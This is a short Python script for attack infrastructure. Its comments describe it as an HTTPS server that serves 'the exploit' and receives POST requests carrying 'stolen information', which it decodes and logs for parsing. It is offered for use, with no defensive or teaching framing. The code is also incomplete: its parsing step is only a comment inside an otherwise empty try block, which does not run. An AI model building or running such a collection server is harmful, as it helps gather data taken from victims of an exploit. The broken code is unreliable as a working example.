#!/usr/bin/env python3

from http.server import HTTPServer, SimpleHTTPRequestHandler
from bs4 import BeautifulSoup
from io import BytesIO
from sys import argv
import sys
import ssl
import urllib.parse


# Simple python server for serving the exploit over HTTPS and 
# to recieve POST data with stolen information.

class requestHandler(SimpleHTTPRequestHandler):
	def do_POST(self):

		#Doing things with incoming POST data
		content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
		body = self.rfile.read(content_length) # <--- Gets the data itself
		bodydata = body.decode('utf-8') # Decodes binary to UTF-8 string
		dec = urllib.parse.unquote(bodydata) # Decodes the string to pretty print from URL encoded format.

		# Optimizing the retreival of address from the large HTTP response.
		try:
			# Parse the value of dec using beautifulsoup or 
			# a library of your choice to retrieve the content of interest.
		except:
			print("Error in parsing the response")

		self.send_response(200)
		self.end_headers()
		response = BytesIO()
		response.write(b'\nA POST request with some data was recieved\n')
		response.write(b'The recieved data shall be logged\n')
		self.wfile.write(response.getvalue())

portstr = argv[1]
port = int(portstr)


# Self signed cert generated using Openssl.

keyloc = "../ssl/key.pem"
certloc = "../ssl/cert.pem"

httpd = HTTPServer(('0.0.0.0', port), requestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, keyfile=keyloc, certfile=certloc, server_side=True)
httpd.serve_forever()
